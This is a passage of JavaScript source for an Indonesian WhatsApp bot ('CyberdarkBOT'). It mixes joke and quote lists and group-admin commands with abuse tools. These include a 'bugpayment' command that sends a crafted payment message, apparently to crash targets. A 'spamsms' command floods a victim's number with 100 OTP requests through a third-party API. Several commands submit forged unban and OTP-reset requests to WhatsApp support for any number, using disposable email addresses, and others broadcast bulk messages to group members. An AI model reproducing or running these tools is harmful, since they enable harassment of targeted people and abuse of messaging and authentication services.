  "Jangan men-dualboot-kan hatiku kepadamu.",
  "cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
  "KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
  "Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
  "cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"
]

let bacotan = pickRandom(heker)
  replyz(bacotan)
}
break
//=========================================\\======
case 'quotesbijak':{
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const quotes = [
"Keyakinan merupakan suatu pengetahuan di dalam hati, jauh tak terjangkau oleh bukti.",
"Rasa bahagia dan tak bahagia bukan berasal dari apa yang kamu miliki, bukan pula berasal dari siapa diri kamu, atau apa yang kamu kerjakan. Bahagia dan tak bahagia berasal dari pikiran kamu.",
"Sakit dalam perjuangan itu hanya sementara. Bisa jadi kamu rasakan dalam semenit, sejam, sehari, atau setahun. Namun jika menyerah, rasa sakit itu akan terasa selamanya.",
"Hanya seseorang yang takut yang bisa bertindak berani. Tanpa rasa takut itu tidak ada apapun yang bisa disebut berani.",
"Jadilah diri kamu sendiri. Siapa lagi yang bisa melakukannya lebih baik ketimbang diri kamu sendiri?",
"Kesempatan kamu untuk sukses di setiap kondisi selalu dapat diukur oleh seberapa besar kepercayaan kamu pada diri sendiri.",
"Kebanggaan kita yang terbesar adalah bukan tidak pernah gagal, tetapi bangkit kembali setiap kali kita jatuh.",
"Suatu pekerjaan yang paling tak kunjung bisa diselesaikan adalah pekerjaan yang tak kunjung pernah dimulai.",
"Pikiran kamu bagaikan api yang perlu dinyalakan, bukan bejana yang menanti untuk diisi.",
"Kejujuran adalah batu penjuru dari segala kesuksesan. Pengakuan adalah motivasi terkuat. Bahkan kritik dapat membangun rasa percaya diri saat disisipkan di antara pujian.",
"Segala sesuatu memiliki kesudahan, yang sudah berakhir biarlah berlalu dan yakinlah semua akan baik-baik saja.",
"Setiap detik sangatlah berharga karena waktu mengetahui banyak hal, termasuk rahasia hati.",
"Jika kamu tak menemukan buku yang kamu cari di rak, maka tulislah sendiri.",
"Jika hatimu banyak merasakan sakit, maka belajarlah dari rasa sakit itu untuk tidak memberikan rasa sakit pada orang lain.",
"Hidup tak selamanya tentang pacar.",
"Rumah bukan hanya sebuah tempat, tetapi itu adalah perasaan.",
"Pilih mana: Orang yang memimpikan kesuksesan atau orang yang membuatnya menjadi kenyataan?",
"Kamu mungkin tidak bisa menyiram bunga yang sudah layu dan berharap ia akan mekar kembali, tapi kamu bisa menanam bunga yang baru dengan harapan yang lebih baik dari sebelumnya.",
"Bukan bahagia yang menjadikan kita bersyukur, tetapi dengan bersyukurlah yang akan menjadikan hidup kita bahagia.",
"Aku memang diam. Tapi aku tidak buta.",
]
let bacotan = pickRandom(quotes)
  replyz(bacotan)
}
break
//
case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  replyz(bacotan)
}
break
// CASE LAINNYA
case 'bugpayment':
if (!isMurbug) return replyz(global.nocreator)
var messa = await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendeqtextMessage": {
"text": `𓁿 •RXHL OFFICIAL• 𓁿`,
}
}}), { userJid: from, quoted: m})
rxhl.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
break

case 'addowner':
if (!isCreator) return replyz(global.nocreator)
if (!args[0]) return replyz(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await rxhl.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return replyz(`Enter a valid number and register on WhatsApp!!!`)
owner.push(bnnd)
murbug.push(bnnd)
fs.writeFileSync('./lib/owner.json', JSON.stringify(owner))
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
replyz(`Number ${bnnd} Has Been Added to Owner!!!`)
break

case 'dellowner':
if (!isCreator) return replyz(global.nocreator)
if (!args[0]) return replyz(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
anp = murbug.indexOf(yaki)
owner.splice(unp, 1)
murbug.splice(anp, 1)
fs.writeFileSync('./lib/owner.json', JSON.stringify(owner))
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
replyz(`Number ${yaki} Has Been Removed From Owner!!!`)
break

case 'addpremium':
if (!isCreator) return replyz(global.nocreator)
if (!args[0]) return replyz(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let cekkanbre = await rxhl.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekkanbre.length == 0) return replyz(`Enter a valid number and register on WhatsApp!!!`)
murbug.push(bnnd)
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
replyz(`Number ${bnnd} Has Been Added to Premium!!!`)
break

case 'dellpremium':
if (!isCreator) return replyz(global.nocreator)
if (!args[0]) return replyz(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = murbug.indexOf(yaki)
murbug.splice(unp, 1)
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
replyz(`Number ${yaki} Has Been Removed From Premium!!!`)
break

case 'listuser':
if (!isCreator) return replyz(global.nocreator)
teksooo = '*List User Vip*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
rxhl.sendMessage(from, { text: teksooo.trim() }, 'extendeqtextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break

case 'listpremium':
if (!isCreator) return replyz(global.nocreator)
teksooo = '*List User Vip*\n\n'
for (let i of murbug) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${murbug.length}*`
rxhl.sendMessage(from, { text: teksooo.trim() }, 'extendeqtextMessage', { quoted:m, contextInfo: { "mentionedJid": murbug } })
break

case 'sound1': case 'sound2': case 'sound3': case 'sound4': case 'sound5': case 'sound6': case 'sound7': case 'sound8': case 'sound9': case 'sound10': case 'sound11': case 'sound12': case 'sound13': case 'sound14': case 'sound15': case 'sound16': case 'sound17': case 'sound18': case 'sound19': case 'sound20': case 'sound21': case 'sound22': case 'sound23': case 'sound24': case 'sound25': case 'sound26': case 'sound27': case 'sound28': case 'sound29': case 'sound30': case 'sound31': case 'sound32': case 'sound33': case 'sound34': case 'sound35': case 'sound36': case 'sound37': case 'sound38': case 'sound39': case 'sound40': case 'sound41': case 'sound42': case 'sound43': case 'sound44': case 'sound45': case 'sound46': case 'sound47': case 'sound48': case 'sound49': case 'sound50': case 'sound51': case 'sound52': case 'sound53': case 'sound54': case 'sound55': case 'sound56': case 'sound57': case 'sound58': case 'sound59': case 'sound60': case 'sound61': case 'sound62': case 'sound63': case 'sound64': case 'sound65': case 'sound66': case 'sound67': case 'sound68': case 'sound69': case 'sound70': case 'sound71': case 'sound72': case 'sound73': case 'sound74': case 'sound75': case 'sound76': case 'sound77': case 'sound78': case 'sound79': case 'sound80': case 'sound81': case 'sound82': case 'sound83': case 'sound84': case 'sound85': case 'sound86': case 'sound87': case 'sound88': case 'sound89': case 'sound90': case 'sound91': case 'sound92': case 'sound93': case 'sound94': case 'sound95': case 'sound96': case 'sound97': case 'sound98': case 'sound99': case 'sound100': case 'sound101': case 'sound102': case 'sound103': case 'sound104': case 'sound105': case 'sound106': case 'sound107': case 'sound108': case 'sound109': case 'sound110': case 'sound111': case 'sound112': case 'sound113': case 'sound114': case 'sound115': case 'sound116': case 'sound117': case 'sound118': case 'sound119': case 'sound120': case 'sound121': case 'sound122': case 'sound123': case 'sound124': case 'sound125': case 'sound126': case 'sound127': case 'sound128': case 'sound129': case 'sound130': case 'sound131': case 'sound132': case 'sound133': case 'sound134': case 'sound135': case 'sound136': case 'sound137': case 'sound138': case 'sound139': case 'sound140': case 'sound141': case 'sound142': case 'sound143': case 'sound144': case 'sound145': case 'sound146': case 'sound147': case 'sound148': case 'sound149': case 'sound150': case 'sound151': case 'sound152': case 'sound153': case 'sound154': case 'sound155': case 'sound156': case 'sound157': case 'sound158': case 'sound159': case 'sound160': case 'sound161':
await loading()
 rxhlganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await rxhl.sendMessage(from, { audio: rxhlganteng, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6282274542640',
title: `CyberdarkBOT-V01`,
sourceUrl: `https://wa.me/6282274542640`, 
thumbnail: rxhlimage
}
}})
break

case 'pushkontak':{
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!qtext) return replyz(global.notext)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
replyz(`*Send a message to ${mem.length} people, time is over ${mem.length * 3} second*`)
for (let geek of mem) {
await sleep(5000)
rxhl.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
replyz(`*Successfully sent message To ${mem.length} person*`)
}
break

case 'bcgroup': {
if (!isCreator) return replyz(global.nocreator)
if (!qtext) return replyz(global.notext)
await loading()
let getGroups = await rxhl.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
replyz(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
for (let i of anu) {
await sleep(1500)
rxhl.sendMessage(i, {text: `${qtext}`}, {quoted:m})
    }
replyz(`Successfully Sending Broadcast To ${anu.length} Group`)
}
break

case 'hidetag': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
await loading()
rxhl.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break

case 'kick': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rxhl.groupParticipantsUpdate(from, [users], 'remove')
}
break

case 'add': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
await loading()
let users = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rxhl.groupParticipantsUpdate(from, [users], 'add')
}
break

case 'promote': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rxhl.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rxhl.groupParticipantsUpdate(from, [users], 'demote')
}
break

case 'editsubjek': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
if (!qtext) return replyz(global.notext)
await loading()
await rxhl.groupUpdateSubject(from, qtext)
}
break

case 'editdesk':{
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
if (!qtext) return replyz(global.notext)
await loading()
await rxhl.groupUpdateDescription(from, qtext)
}
break

case 'linkgroup': case 'linkgc': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
await loading()
let responsegg = await rxhl.groupInviteCode(from)
rxhl.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
await loading()
rxhl.groupRevokeInvite(from)
break

case 'public': {
if (!isCreator) return replyz(global.nocreator)
rxhl.public = true
replyz('Sukse Change To Public')
}
break

case 'self': {
if (!isCreator) return replyz(global.nocreator)
rxhl.public = false
replyz('Sukse Change To Self')
}
break

case 'unbanned': {
if (!isMurbug) return replyz(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Привет WhatsApp Мой номер WhatsApp был заблокирован без причины. Пожалуйста, повторно активируйте мой номер WhatsApp, так как этот номер содержит много моей личной информации, которую я храню на этом номере, а также использую этот номер для своей офисной работы, что очень важно. Пожалуйста, активируйте мой номер WhatsApp как можно скорее. Спасибо.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replyz(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else replyz(util.format(res.data))
} catch (err) {replyz(`${err}`)}
} else replyz('Insert Number')
}
break

case 'unbannedv2': {
if (!isMurbug) return replyz(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Привет, поддержка WhatsApp. Несколько дней назад я открыл приложение WhatsApp, но получил уведомление о том, что моя учетная запись WhatsApp не авторизована, и попросил зарегистрировать новый номер телефона. Почему мой номер не может использовать WhatsApp? Я считаю, что я никогда не нарушал политику WhatsApp, никогда не причинял вреда другим пользователям WhatsApp и использую WhatsApp только для бизнеса своей компании. Пожалуйста, повторно активируйте мой номер WhatsApp, поскольку этот номер содержит важные данные для моего бизнеса и деятельности. Пожалуйста, обработайте мой запрос как можно быстрее.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replyz(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else replyz(util.format(res.data))
} catch (err) {replyz(`${err}`)}
} else replyz('Insert Number!')
}
break

case 'unbannedv3': {
if (!isMurbug) return replyz(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Здравствуйте, доброе утро, WhatsApp. Я пользователь WhatsApp со следующим номером ${targetnya}. У меня возникла проблема с блокировкой моего номера WhatsApp. Когда я открыл приложение WhatsApp, я получил уведомление: «Эта учетная запись не может использовать приложение WhatsApp». Раньше я отправлял сообщения в чат своей семье только во время работы. и я не считаю, что совершил какое-либо нарушение условий обслуживания WhatsApp. Приношу извинения, я рассматриваю возможность повторной активации заблокированной учетной записи WhatsApp. Спасибо`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replyz(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else replyz(util.format(res.data))
} catch (err) {replyz(`${err}`)}
} else replyz('Insert number!')
}
break

case 'resetotp': {
if (!isMurbug) return replyz(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Olá, suporte pelo WhatsApp. Alguém tentou fazer login na minha conta do Whatsapp, então estou desconectado da minha conta do Whatsapp, mas infelizmente não consigo mais fazer login na minha conta do Whatsapp porque tenho que esperar 12 horas para receber o código de verificação. Por favor, redefina meu código de verificação do WhatsApp.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replyz(`i have reset the otp on that number and remember it only works if the otp is more than 3 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else replyz(util.format(res.data))
} catch (err) {replyz(`${err}`)}
} else replyz('Insert number!')
}
break

case 'spamsms': {
if (!isMurbug) return replyz('*Premium only*')
await loading()
const froms = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || qtext) {
if (froms.startsWith('08')) return replyz('Awali nomor dengan +62')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY RXHL`);
});
}
} else replyz(`Use of spam SMS number/reply target message*\nExample of spam SMS +6281214281312`)
replyz(`SMS/call spam will be sent to the target number`)
}
break

case 'infobot':
infobot = {
image: rxhlimage,
caption: `*Hallo ${pushname}*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*INFO CREATOR AND BOT*
NameBot : CyberdarkBOT 
Creator     : Mr.Ellen
Partner     : Alena Bot .sh 
                  : Raynara\
                  
Server : Linux 
Speed : 944.9297           
Library : *Baileys V6.6.0*
Versi Bot: V01
Versi Whatsapp : 2.24.12.78
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
`
}
rxhl.sendMessage(from, infobot)
break

case 'sticker':
 if (!quoted) return replyz(`Reply to Video/Image With Caption ${prefix + command}`)
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await rxhl.sendImageAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyz('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await rxhl.sendVideoAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
await fs.unlinkSync(encmedia)
} else {
return replyz(`Send Images/Videos With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
break

case 'attp':
if (args.length == 0) return replyz(global.notext)
await loading()
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
rxhl.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break

case 'smeme':
if (!qtext) return replyz(global.notext)
if (!quoted) throw `Reply to Image With Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
mee = await rxhl.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${qtext}.png?background=${mem}`)
rxhl.sendImageAsSticker(from, kaytid, m, { packname: global.sticker1, author: global.sticker2 })
}
break

case 'tiktokmp4':{
if (!qtext) return replyz( `Example : ${prefix + command} link`)
linkRegexx = args.join(" ")
codedd = linkRegexx.split("https://vt.tiktok.com/")[1]
if (!codedd) return replyz("Link Invalid")
await loading()
require('./lib/tiktok').Tiktok(q).then( data => {
rxhl.sendMessage(from, { caption: `Ellen Official!`, video: { url: data.watermark }}, {quoted:m})
})}
break

case 'inspect': case 'getidgrup': {
if (!isMurbug) return replyz(global.nocreator)
if (!qtext) return replyz('Link?')
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return replyz("Link Invalid")
rxhl.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`
replyz(tekse)
})}
break

case 'tiktokmp3':{
if (!qtext) return replyz( `Example : ${prefix + command} link`)
linkRegexx = args.join(" ")
